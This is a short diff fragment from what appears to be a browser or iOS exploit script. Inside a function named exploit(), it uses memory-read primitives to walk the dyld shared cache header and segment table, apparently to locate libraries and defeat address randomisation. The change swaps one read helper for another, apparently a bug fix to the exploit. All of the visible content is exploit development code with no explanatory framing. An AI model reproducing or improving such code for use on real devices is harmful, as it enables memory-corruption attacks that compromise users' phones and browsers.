@@ -511,7 +511,7 @@ function exploit(){
 	    var dcache_base_seg = null;
 	    var dcache_nsegs = memory.read_i32(dcache_base + 0x14);
         log('[+] The dyld shared cache seems to have '+dcache_nsegs+' segments.');
-	    var dcache_segdata = memory.read_i64(Add(dcache_base, memory.u32(Add(dcache_base, 0x10))), 0, dcache_nsegs * 0x20);
+	    var dcache_segdata = memory.read_i64(Add(dcache_base, memory.read_i32(Add(dcache_base, 0x10))), 0, dcache_nsegs * 0x20);
 	    var dcache_segs = [];
 	    for(var i = 0; i < dcache_nsegs; i++){
 	    	var off = i * 0x20;
